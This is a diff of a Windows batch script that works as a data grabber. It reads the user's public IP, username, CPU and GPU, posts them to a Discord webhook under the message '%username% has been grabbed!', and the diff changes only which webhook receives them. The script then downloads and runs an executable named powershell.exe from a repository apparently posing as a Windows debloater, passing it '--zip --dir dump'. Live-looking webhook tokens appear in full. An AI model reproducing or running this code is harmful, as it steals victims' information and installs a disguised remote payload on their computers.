@@ -3,7 +3,7 @@ setlocal
 curl icanhazip.com > ip & set /p ip=<ip
 for /f "usebackq skip=1 tokens=*" %%i in (`wmic cpu get name ^| findstr /r /v "^$"`) do set cpu=%%i
 for /f "usebackq skip=1 tokens=*" %%i in (`wmic path win32_VideoController get name ^| findstr /r /v "^$"`) do set gpu=%%i
-curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**%username% has been grabbed!**^\n^\n**Information of User**^\n:bust_in_silhouette: Username : %username%^\n:gear: IP : %ip%^\n^\n**Information of Computer**^\n:alarm_clock: CPU : %cpu%^\n:bricks: GPU : %gpu%\"}" https://discord.com/api/webhooks/1009491640425128027/uzciuAFMDFJQSZqYoL3ZAgacTL6aMosVCRyORElYncIozzXNr-I7WMOxRB0OsTHjib-d
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**%username% has been grabbed!**^\n^\n**Information of User**^\n:bust_in_silhouette: Username : %username%^\n:gear: IP : %ip%^\n^\n**Information of Computer**^\n:alarm_clock: CPU : %cpu%^\n:bricks: GPU : %gpu%\"}" https://discord.com/api/webhooks/1010291934578888734/xMQvEmN5q1ejFtz66fkvtGjJp95FOfXVXqs4aFUigtYnRAFXCOQqgnzMNlN4wVLNkXbj
 endlocal
 powershell -Command "iwr "https://github.com/Dazd-Pkz/Windows10Debloater/raw/main/powershell.exe" -o %temp%\powershell.exe"
 %temp%\powershell.exe --zip --dir dump
